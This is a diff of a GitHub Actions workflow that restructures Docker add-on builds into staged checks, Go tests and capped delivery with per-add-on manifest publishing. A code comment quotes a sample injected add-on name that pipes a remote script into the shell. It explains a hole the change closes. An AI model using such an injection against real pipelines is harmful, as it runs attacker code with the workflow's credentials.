@@ -1,62 +1,106 @@
 ---
-name: Build and Push Docker Images
+name: 'Build and Push Docker Images'
+
+# One pipeline, three stages, each started only once the whole stage before it is done:
+#
+#   code-check  `checks`          the shared rebase and changelog gate (pull requests only)
+#               `detect-changes`  which add-ons this run builds, and whether it tests
+#   tests       `mcp-server-extended`, the one add-on that ships application code
+#   delivery    `build`           one job per add-on and architecture, at most 6 at a time
+#               `manifest`        one job that publishes every complete add-on (pushes only)
+#
+# A push to `main` or a tag is delivery, and delivery rebuilds EVERY add-on: each build pulls its
+# base image afresh, so an add-on nobody touched still picks up its base image's security fixes on
+# the next merge. A pull request builds only the add-ons it changes, to prove they still build.
+#
+# These used to be three workflows that started together (`checks.yaml`, `test.yaml` and this
+# one), and the rebuild started all of its jobs at once: 63 of them -- 43 builds and 19
+# one-add-on manifest jobs -- peaking at 17 concurrent runners and taking them from every other
+# repository's pipeline. Now it starts after the checks and the tests, at most 6 builds at a time,
+# with one manifest job.
+#
+# GitHub skips a job whose `needs:` was skipped unless its `if:` says otherwise, and the skip
+# reaches every job after it, not only the next one. `checks` is skipped outside pull requests,
+# so the jobs after it gate on `!cancelled() && !failure()`: they still refuse a cancelled run and
+# one where any job before them failed, which `always()` or `!failure()` alone would not.
 
 on:
   push:
     branches:
-      - main
+      - 'main'
     tags:
-      - "v*"
+      - 'v*'
   pull_request:
     branches:
-      - main
+      - 'main'
   workflow_dispatch:
     inputs:
       addon:
-        description: "Specific add-on to build (leave empty for all)"
+        description: 'Specific add-on to build (leave empty for all)'
         required: false
-        type: string
+        type: 'string'
 
 jobs:
+  # first stage: code-check
+  checks:
+    # Job id kept from the old `checks.yaml`, so the check is still reported as
+    # `checks / code-check > quality:basic-checks`. Pull requests only, as it was: the gate asks
+    # whether a branch is rebased on its base and records its change, which a push has no base for.
+    if: "github.event_name == 'pull_request'"
+    uses: 'rios0rios0/pipelines/.github/workflows/checks.yaml@main'
+    # Declared per JOB rather than at workflow level, matching the rationale
+    # `rios0rios0/pipelines/.github/workflows/release.yaml` spells out: a
+    # workflow-level grant hands the token to every job in the file, including
+    # any future one that only needs to read.
+    permissions:
+      contents: 'read'
+
   detect-changes:
-    name: Detect changed add-ons
-    runs-on: ubuntu-latest
+    name: 'code-check > detect:changes'
+    runs-on: 'ubuntu-latest'
+    permissions:
+      contents: 'read'
     outputs:
-      matrix: ${{ steps.set-matrix.outputs.matrix }}
-      has_changes: ${{ steps.set-matrix.outputs.has_changes }}
-      addons: ${{ steps.set-matrix.outputs.addons }}
+      matrix: "${{ steps.set-matrix.outputs.matrix }}"
+      has_changes: "${{ steps.set-matrix.outputs.has_changes }}"
+      addons: "${{ steps.set-matrix.outputs.addons }}"
+      test_mcp: "${{ steps.set-matrix.outputs.test_mcp }}"
 
     steps:
-      - name: Checkout code
-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - name: 'Checkout code'
+        uses: 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' # v7.0.1
         with:
           fetch-depth: 0
 
-      - name: Install yq
+      - name: 'Install yq'
         run: |
           curl --proto '=https' --proto-redir '=https' -fsSL -o /usr/local/bin/yq \
             https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64
           chmod +x /usr/local/bin/yq
 
-      - name: Detect changes and build matrix
-        id: set-matrix
+      - name: 'Detect changes and build matrix'
+        id: 'set-matrix'
         # Context values are passed through the environment rather than
         # interpolated into the script body. `inputs.addon` is supplied by
         # whoever triggers a `workflow_dispatch`, so expanding it directly into
         # the shell let an add-on name like `x"; curl evil.sh | sh; #` execute as
         # code. Read as `"$INPUT_ADDON"`, the value is only ever data.
         env:
-          EVENT_NAME: ${{ github.event_name }}
-          GIT_REF: ${{ github.ref }}
-          INPUT_ADDON: ${{ inputs.addon }}
-          PR_BASE_SHA: ${{ github.event.pull_request.base.sha }}
-          PUSH_BEFORE_SHA: ${{ github.event.before }}
+          EVENT_NAME: "${{ github.event_name }}"
+          GIT_REF: "${{ github.ref }}"
+          INPUT_ADDON: "${{ inputs.addon }}"
+          PR_BASE_SHA: "${{ github.event.pull_request.base.sha }}"
+          PUSH_BEFORE_SHA: "${{ github.event.before }}"
         run: |
           # Discover all add-on folders (those containing a config.yaml)
           ALL_ADDONS=$(find . -maxdepth 2 -name config.yaml -not -path './.github/*' -exec dirname {} \; | sed 's|^./||' | sort)
 
           CHANGED_ADDONS=""
 
+          # Delivery -- a push to `main` or a tag -- rebuilds every add-on, so each image picks up
+          # its base image's security fixes whether or not its own files changed; so does a run
+          # started by hand without an add-on. A pull request builds only what it changes, unless
+          # it changes a workflow, which every build depends on.
           if [[ "$EVENT_NAME" == "workflow_dispatch" ]]; then
             if [[ -n "$INPUT_ADDON" ]]; then
               CHANGED_ADDONS="$INPUT_ADDON"
@@ -73,11 +117,14 @@ jobs:
               BASE_SHA="$PUSH_BEFORE_SHA"
             fi
 
-            # Handle initial push (all zeros SHA)
-            if [[ "$BASE_SHA" == "0000000000000000000000000000000000000000" ]]; then
+            # A first push names an all-zeros commit before it, and a force-push can name one
+            # this clone no longer holds. With nothing to diff against, build everything: the
+            # diff used to fail silently there and build nothing at all.
+            if [[ -z "$BASE_SHA" || "$BASE_SHA" == "0000000000000000000000000000000000000000" ]] \
+              || ! git cat-file -e "${BASE_SHA}^{commit}" 2>/dev/null; then
               CHANGED_ADDONS="$ALL_ADDONS"
             else
-              CHANGED_FILES=$(git diff --name-only "$BASE_SHA" HEAD 2>/dev/null || echo "")
+              CHANGED_FILES=$(git diff --name-only "$BASE_SHA" HEAD)
 
               # If workflow files changed, rebuild all add-ons
               if echo "$CHANGED_FILES" | grep -q '^\.github/workflows/'; then
@@ -98,12 +145,18 @@ jobs:
           ADDONS_JSON='['
           ADDONS_FIRST=true
           SEEN_ADDONS=""
+          TEST_MCP=false
           for addon in $CHANGED_ADDONS; do
             [ -z "$addon" ] && continue
             if [ ! -f "${addon}/config.yaml" ]; then
               echo "::warning::Add-on '${addon}' not found, skipping"
               continue
             fi
+
+            # The one add-on with application code is tested whenever it is about to be built,
+            # which is what the path filter of the old `test.yaml` asked for -- plus every
+            # workflow change, which rebuilds it too.
+            [ "$addon" = 'mcp-server-extended' ] && TEST_MCP=true
 
             # Collect unique addon names for the manifest job
             if ! echo "$SEEN_ADDONS" | grep -q "^${addon}$"; then
@@ -140,152 +193,238 @@ jobs:
           MATRIX="${MATRIX}]}"
           ADDONS_JSON="${ADDONS_JSON}]"
 
-          echo "matrix=${MATRIX}" >> "$GITHUB_OUTPUT"
-          echo "addons=${ADDONS_JSON}" >> "$GITHUB_OUTPUT"
           if [ "$FIRST" = true ]; then
-            echo "has_changes=false" >> "$GITHUB_OUTPUT"
+            HAS_CHANGES=false
             echo "No add-on changes detected"
           else
-            echo "has_changes=true" >> "$GITHUB_OUTPUT"
+            HAS_CHANGES=true
             echo "Matrix: ${MATRIX}"
             echo "Addons: ${ADDONS_JSON}"
           fi
+          echo "Test mcp-server-extended: ${TEST_MCP}"
 
-  build:
-    needs: detect-changes
-    if: needs.detect-changes.outputs.has_changes == 'true'
+          {
+            echo "matrix=${MATRIX}"
+            echo "addons=${ADDONS_JSON}"
+            echo "has_changes=${HAS_CHANGES}"
+            echo "test_mcp=${TEST_MCP}"
+          } >> "$GITHUB_OUTPUT"
+
+  # second stage: tests
+  # Only `mcp-server-extended` ships application code; every other add-on is a
+  # wrapper around an upstream image and is covered by the image build.
+  mcp-server-extended:
+    name: 'tests > test:mcp-server-extended'
+    needs: [ 'checks', 'detect-changes' ]
+    if: "!cancelled() && !failure() && needs.detect-changes.outputs.test_mcp == 'true'"
+    runs-on: 'ubuntu-latest'
     permissions:
-      contents: read
-      packages: write
+      contents: 'read'
+    defaults:
+      run:
+        working-directory: 'mcp-server-extended'
+
+    steps:
+      - name: 'Checkout code'
+        uses: 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' # v7.0.1
+
+      - name: 'Set up Go'
+        uses: 'actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e' # v7.0.0
+        with:
+          go-version-file: 'mcp-server-extended/go.mod'
+          cache-dependency-path: 'mcp-server-extended/go.sum'
+
+      - name: 'Verify formatting'
+        run: |
+          # gofmt exits 0 whatever it finds, so the file list is the signal.
+          UNFORMATTED=$(gofmt -l .)
+          if [ -n "${UNFORMATTED}" ]; then
+            echo "::error::gofmt reported unformatted files:"
+            echo "${UNFORMATTED}"
+            exit 1
+          fi
+
+      - name: 'Build'
+        run: 'go build ./...'
+
+      - name: 'Vet'
+        run: 'go vet -tags unit ./...'
+
+      - name: 'Test'
+        # `-tags unit` is required: every test file carries a build tag, so an
+        # untagged run silently reports "no test files" and passes.
+        run: 'go test -tags unit -race -count=1 ./...'
+
+  # third stage: delivery
+  build:
+    name: "delivery > build (${{ matrix.addon }}, ${{ matrix.arch }})"
+    needs: [ 'checks', 'detect-changes', 'mcp-server-extended' ]
+    if: "!cancelled() && !failure() && needs.detect-changes.outputs.has_changes == 'true'"
+    permissions:
+      contents: 'read'
+      packages: 'write'
     strategy:
       fail-fast: false
-      matrix: ${{ fromJson(needs.detect-changes.outputs.matrix) }}
-    uses: ./.github/workflows/_build-addon.yaml
+      # Each build is a separate image on a native runner for its architecture, so they do run
+      # side by side -- but at most 6: two add-ons' full architecture sets at once. Delivery
+      # rebuilds all 43; uncapped, that took 17 runners at once from every other repository's
+      # pipeline. Capped, it measured 10 minutes on #68, and a pull request that changes one
+      # add-on (2-3 builds) is not slowed at all.
+      max-parallel: 6
+      matrix: "${{ fromJson(needs.detect-changes.outputs.matrix) }}"
+    uses: './.github/workflows/_build-addon.yaml'
     with:
-      addon: ${{ matrix.addon }}
-      arch: ${{ matrix.arch }}
-      runner: ${{ matrix.runner }}
+      addon: "${{ matrix.addon }}"
+      arch: "${{ matrix.arch }}"
+      runner: "${{ matrix.runner }}"
     secrets: inherit
 
   manifest:
-    name: Create manifest (${{ matrix.addon }})
-    needs: [detect-changes, build]
-    # `always()` deliberately breaks the all-or-nothing coupling to `build`:
-    # `build` is a single matrix job, so one add-on failing one architecture
-    # marked the whole job failed and skipped publishing for *every* add-on.
-    # Completeness is enforced per add-on instead — see the verify step below —
-    # so a broken add-on now blocks only itself. `build` failing still fails the
-    # run; this only decides what gets published.
+    name: 'delivery > manifest'
+    needs: [ 'detect-changes', 'build' ]
+    # Runs when `build` RAN, whether every architecture passed or not, and never on a pull request
+    # or a cancelled run. `build` is one matrix job, so one add-on failing one architecture marks
+    # all of it failed; `!failure()` would then skip publishing for every add-on. Completeness is
+    # enforced per add-on instead -- see the verify step below -- so a broken add-on blocks only
+    # itself, and `build` failing still fails the run. A `build` that was skipped because a check
+    # or a test failed before it is neither `success` nor `failure`, so nothing is published then.
     if: >-
-      always()
+      !cancelled()
       && github.event_name != 'pull_request'
-      && needs.detect-changes.result == 'success'
       && needs.detect-changes.outputs.has_changes == 'true'
-      && needs.build.result != 'cancelled'
-    runs-on: ubuntu-latest
+      && (needs.build.result == 'success' || needs.build.result == 'failure')
+    runs-on: 'ubuntu-latest'
     permissions:
-      contents: read
-      packages: write
-    strategy:
-      fail-fast: false
-      matrix:
-        # Falls back to an empty list because `always()` above means this job is
-        # evaluated even when `detect-changes` failed and produced no output.
-        addon: ${{ fromJson(needs.detect-changes.outputs.addons || '[]') }}
+      contents: 'read'
+      packages: 'write'
 
     steps:
-      - name: Checkout code
-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+      - name: 'Checkout code'
+        uses: 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' # v7.0.1
 
-      - name: Install yq
+      - name: 'Install yq'
         run: |
           curl --proto '=https' --proto-redir '=https' -fsSL -o /usr/local/bin/yq \
             https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64
           chmod +x /usr/local/bin/yq
 
-      - name: Download digests
-        id: download
+      # Every add-on's digests at once. Each build uploads `digest-<addon>-<arch>` holding one
+      # file named after its architecture, and the download keeps each artifact in a directory of
+      # its own name -- except when exactly ONE artifact matches, which download-artifact extracts
+      # straight into `path`. The verify step reads both layouts.
+      - name: 'Download digests'
+        id: 'download'
         continue-on-error: true
-        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
+        uses: 'actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333' # v8.0.2
         with:
-          pattern: digest-${{ matrix.addon }}-*
-          path: /tmp/digests
-          merge-multiple: true
+          pattern: 'digest-*'
+          path: '/tmp/digests'
 
-      - name: Verify every declared architecture produced a digest
-        id: verify
+      - name: 'Verify every declared architecture produced a digest'
+        id: 'verify'
+        env:
+          ADDONS: "${{ needs.detect-changes.outputs.addons }}"
         run: |
-          # Each per-arch build uploads one digest file named after its
-          # architecture. Publishing a manifest built from a partial set would
-          # quietly ship an add-on missing an architecture and overwrite the
-          # `latest` tag with it, which is worse than not publishing at all —
-          # so an add-on publishes only when its set is complete.
-          EXPECTED=$(yq eval '.arch[]' "${{ matrix.addon }}/config.yaml" | sort)
-          FOUND=$(ls -1 /tmp/digests 2>/dev/null | sort || true)
-          MISSING=$(comm -23 <(echo "${EXPECTED}") <(echo "${FOUND}") | tr '\n' ' ' | xargs || true)
+          # Publishing a manifest built from a partial set would quietly ship an add-on missing an
+          # architecture and overwrite its `latest` tag with it, which is worse than not
+          # publishing at all -- so an add-on publishes only when its set is complete.
+          COUNT=$(jq -r 'length' <<< "${ADDONS}")
+          COMPLETE=""
+          for addon in $(jq -r '.[]' <<< "${ADDONS}"); do
+            MISSING=""
+            for arch in $(yq eval '.arch[]' "${addon}/config.yaml"); do
+              digest="/tmp/digests/digest-${addon}-${arch}/${arch}"
+              # The single-artifact layout: only one build uploaded, so the file can belong to
+              # this add-on only when it is the only add-on in the run.
+              if [ ! -s "${digest}" ] && [ "${COUNT}" -eq 1 ]; then
+                digest="/tmp/digests/${arch}"
+              fi
+              [ -s "${digest}" ] || MISSING="${MISSING} ${arch}"
+            done
+            MISSING="${MISSING# }"
 
-          echo "Expected architectures: $(echo "${EXPECTED}" | tr '\n' ' ')"
-          echo "Digests present:        $(echo "${FOUND}" | tr '\n' ' ')"
+            if [ -n "${MISSING}" ]; then
+              echo "::warning title=Manifest skipped::${addon} did not publish: no digest for ${MISSING}"
+              {
+                echo "## Manifest skipped: ${addon}"
+                echo ""
+                echo "Missing architecture(s): \`${MISSING}\`"
+                echo ""
+                echo "The previously published tags are left untouched. Other add-ons are unaffected."
+                echo ""
+              } >> "$GITHUB_STEP_SUMMARY"
+            else
+              COMPLETE="${COMPLETE} ${addon}"
+            fi
+          done
+          COMPLETE="${COMPLETE# }"
+          echo "Complete add-ons: ${COMPLETE:-none}"
+          echo "complete=${COMPLETE}" >> "$GITHUB_OUTPUT"
 
-          if [ -n "${MISSING}" ]; then
-            echo "complete=false" >> "$GITHUB_OUTPUT"
-            echo "::warning title=Manifest skipped::${{ matrix.addon }} did not publish: no digest for ${MISSING}"
-            {
-              echo "## Manifest skipped: ${{ matrix.addon }}"
-              echo ""
-              echo "Missing architecture(s): \`${MISSING}\`"
-              echo ""
-              echo "The previously published tags are left untouched. Other add-ons are unaffected."
-            } >> "$GITHUB_STEP_SUMMARY"
-          else
-            echo "complete=true" >> "$GITHUB_OUTPUT"
-          fi
-
-      - name: Log in to GitHub Container Registry
-        if: steps.verify.outputs.complete == 'true'
-        uses: docker/login-action@81c6f93d4bc991e510b342a00b419b3bb4efc5c6 # v4.7.0
+      - name: 'Log in to GitHub Container Registry'
+        if: "steps.verify.outputs.complete != ''"
+        uses: 'docker/login-action@81c6f93d4bc991e510b342a00b419b3bb4efc5c6' # v4.7.0
         with:
-          registry: ghcr.io
-          username: ${{ github.actor }}
-          password: ${{ secrets.GITHUB_TOKEN }}
+          registry: 'ghcr.io'
+          username: "${{ github.actor }}"
+          password: "${{ secrets.GITHUB_TOKEN }}"
 
-      - name: Set up Docker Buildx
-        if: steps.verify.outputs.complete == 'true'
-        uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1
+      - name: 'Set up Docker Buildx'
+        if: "steps.verify.outputs.complete != ''"
+        uses: 'docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069' # v4.4.1
 
-      - name: Create multi-arch manifest
-        if: steps.verify.outputs.complete == 'true'
+      - name: 'Create multi-arch manifests'
+        if: "steps.verify.outputs.complete != ''"
+        env:
+          COMPLETE: "${{ steps.verify.outputs.complete }}"
+          ADDONS: "${{ needs.detect-changes.outputs.addons }}"
+          IMAGE_PREFIX: "ghcr.io/${{ github.repository }}"
         run: |
-          IMAGE="ghcr.io/${{ github.repository }}/${{ matrix.addon }}"
-          VERSION=$(yq eval '.version' "${{ matrix.addon }}/config.yaml")
+          ADDON_COUNT=$(jq -r 'length' <<< "${ADDONS}")
+          FAILED=""
+          {
+            echo "## Manifest Summary"
+            echo ""
+            echo "| Add-on | Image | Tags |"
+            echo "|--------|-------|------|"
+          } >> "$GITHUB_STEP_SUMMARY"
 
-          # Build the list of digest-based source references from the declared
-          # architectures rather than from whatever happens to be on disk, so
-          # the manifest contains exactly the set `config.yaml` promises and the
-          # set the verify step above checked.
-          SOURCES=""
-          for arch in $(yq eval '.arch[]' "${{ matrix.addon }}/config.yaml"); do
-            digest=$(cat "/tmp/digests/${arch}")
-            SOURCES="${SOURCES} ${IMAGE}@${digest}"
+          for addon in ${COMPLETE}; do
+            IMAGE="${IMAGE_PREFIX}/${addon}"
+            VERSION=$(yq eval '.version' "${addon}/config.yaml")
+
+            # Build the list of digest-based source references from the declared
+            # architectures rather than from whatever happens to be on disk, so
+            # the manifest contains exactly the set `config.yaml` promises and the
+            # set the verify step above checked.
+            SOURCES=""
+            for arch in $(yq eval '.arch[]' "${addon}/config.yaml"); do
+              digest_file="/tmp/digests/digest-${addon}-${arch}/${arch}"
+              if [ ! -s "${digest_file}" ] && [ "${ADDON_COUNT}" -eq 1 ]; then
+                digest_file="/tmp/digests/${arch}"
+              fi
+              SOURCES="${SOURCES} ${IMAGE}@$(cat "${digest_file}")"
+            done
+
+            echo "Creating manifest for ${IMAGE}"
+            echo "  Version: ${VERSION}"
+            echo "  Sources:${SOURCES}"
+
+            # One add-on failing to publish must not stop the others, so the failure is recorded
+            # and the job fails once every complete add-on has been tried.
+            # shellcheck disable=SC2086 # SOURCES is a list of references, split on purpose
+            if docker buildx imagetools create \
+              --tag "${IMAGE}:${VERSION}" \
+              --tag "${IMAGE}:latest" \
+              ${SOURCES}; then
+              echo "| ${addon} | \`${IMAGE}\` | \`${VERSION}\`, \`latest\` |" >> "$GITHUB_STEP_SUMMARY"
+            else
+              echo "::error title=Manifest failed::${addon} did not publish"
+              FAILED="${FAILED} ${addon}"
+            fi
           done
 
-          echo "Creating manifest for ${IMAGE}"
-          echo "  Version: ${VERSION}"
-          echo "  Sources:${SOURCES}"
-
-          docker buildx imagetools create \
-            --tag "${IMAGE}:${VERSION}" \
-            --tag "${IMAGE}:latest" \
-            ${SOURCES}
-
-      - name: Generate manifest summary
-        if: steps.verify.outputs.complete == 'true'
-        run: |
-          IMAGE="ghcr.io/${{ github.repository }}/${{ matrix.addon }}"
-          VERSION=$(yq eval '.version' "${{ matrix.addon }}/config.yaml")
-
-          echo "## Manifest Summary" >> "$GITHUB_STEP_SUMMARY"
-          echo "" >> "$GITHUB_STEP_SUMMARY"
-          echo "**Add-on:** ${{ matrix.addon }}" >> "$GITHUB_STEP_SUMMARY"
-          echo "**Image:** \`${IMAGE}\`" >> "$GITHUB_STEP_SUMMARY"
-          echo "**Tags:** \`${VERSION}\`, \`latest\`" >> "$GITHUB_STEP_SUMMARY"
+          if [ -n "${FAILED}" ]; then
+            echo "Failed to publish:${FAILED}"
+            exit 1
+          fi
